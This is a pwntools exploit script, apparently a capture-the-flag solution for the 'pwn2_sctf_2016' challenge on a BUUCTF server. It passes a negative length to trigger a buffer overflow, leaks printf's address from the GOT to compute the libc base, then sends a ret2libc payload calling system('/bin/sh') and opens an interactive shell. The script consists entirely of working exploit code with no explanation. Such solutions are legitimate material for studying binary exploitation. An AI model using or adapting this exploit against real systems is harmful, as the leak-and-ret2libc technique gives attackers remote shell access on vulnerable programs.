from pwn import *
context.log_level = 'debug'

p = remote("pwn.buuoj.cn", 20087)
elf = ELF("./pwn2_sctf_2016")
libc = ELF("x86_libc.so.6")
#libc = ELF("libc-2.23.so")
if args.G:
	gdb.attach(p)
vuln = 0x804852f

p.recvuntil("read? ")
p.sendline("-1")
p.recvuntil("data!\n")
payload = 'a' *(48) + p32(elf.plt['printf']) + p32(vuln) +  p32(elf.got['printf'])
p.sendline(payload)
p.recvline_startswith('You said')
printf_addr = u32(p.recv(4))
log.success("printf_addr ==> " + hex(printf_addr))
libc_base = printf_addr - libc.sym['printf']
log.success("libc_base ==> " + hex(libc_base))
system_addr = libc.sym['system'] + libc_base
binsh_addr = libc.search("/bin/sh").next() + libc_base

p.recvuntil("read? ")
p.sendline("-1")
p.recvuntil("data!\n")
payload = 'a' *(48) + p32(system_addr) + p32(vuln) +  p32(binsh_addr)
p.sendline(payload)

p.interactive()

